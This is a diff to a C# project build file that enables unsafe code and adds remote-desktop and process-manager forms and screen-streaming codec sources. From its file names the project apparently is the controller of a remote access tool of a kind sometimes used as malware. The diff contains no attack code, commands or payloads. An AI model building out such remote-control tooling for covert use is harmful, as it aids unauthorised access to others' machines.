@@ -21,6 +21,7 @@
     <DefineConstants>DEBUG;TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -55,6 +56,18 @@
     <Compile Include="Forms\Form1.Designer.cs">
       <DependentUpon>Form1.cs</DependentUpon>
     </Compile>
+    <Compile Include="Forms\ProcessManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\ProcessManager.Designer.cs">
+      <DependentUpon>ProcessManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\RemoteDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\RemoteDesktop.Designer.cs">
+      <DependentUpon>RemoteDesktop.cs</DependentUpon>
+    </Compile>
     <Compile Include="Handle Packet\HandlePacket.cs" />
     <Compile Include="Helper.cs" />
     <Compile Include="MessagePack\BytesTools.cs" />
@@ -73,8 +86,44 @@
     <Compile Include="Settings.cs" />
     <Compile Include="Socket\Clients.cs" />
     <Compile Include="Socket\Listener.cs" />
+    <Compile Include="StreamLibrary\Codecs\DirectDriverCodec.cs" />
+    <Compile Include="StreamLibrary\Codecs\MJPGCodec.cs" />
+    <Compile Include="StreamLibrary\Codecs\QuickCachedStreamCodec.cs" />
+    <Compile Include="StreamLibrary\Codecs\QuickStreamCodec.cs" />
+    <Compile Include="StreamLibrary\Codecs\SmallCachedStreamCodec.cs" />
+    <Compile Include="StreamLibrary\Codecs\SmallStreamCodec.cs" />
+    <Compile Include="StreamLibrary\Encoders\GridCoder\GridBlock.cs" />
+    <Compile Include="StreamLibrary\Encoders\GridCoder\GridEncoder.cs" />
+    <Compile Include="StreamLibrary\Enums.cs" />
+    <Compile Include="StreamLibrary\IEncoder.cs" />
+    <Compile Include="StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="StreamLibrary\src\CRC32.cs" />
+    <Compile Include="StreamLibrary\src\ExtensionAttribute.cs" />
+    <Compile Include="StreamLibrary\src\Extentions.cs" />
+    <Compile Include="StreamLibrary\src\FastBitmap.cs" />
+    <Compile Include="StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="StreamLibrary\src\MurmurHash2Unsafe.cs" />
+    <Compile Include="StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="StreamLibrary\src\PayloadWriter.cs" />
+    <Compile Include="StreamLibrary\src\PointerHelper.cs" />
+    <Compile Include="StreamLibrary\src\SafeQuickLZ.cs" />
+    <Compile Include="StreamLibrary\src\SimpleBitmap.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeCacheCodec.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeCachedStreamCodec.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeMiniCodec.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeOptimizedCodec.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeQuickStream.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
     <EmbeddedResource Include="Forms\Form1.resx">
       <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\ProcessManager.resx">
+      <DependentUpon>ProcessManager.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\RemoteDesktop.resx">
+      <DependentUpon>RemoteDesktop.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
@@ -108,5 +157,6 @@
   <ItemGroup>
     <Content Include="async_icon.ico" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
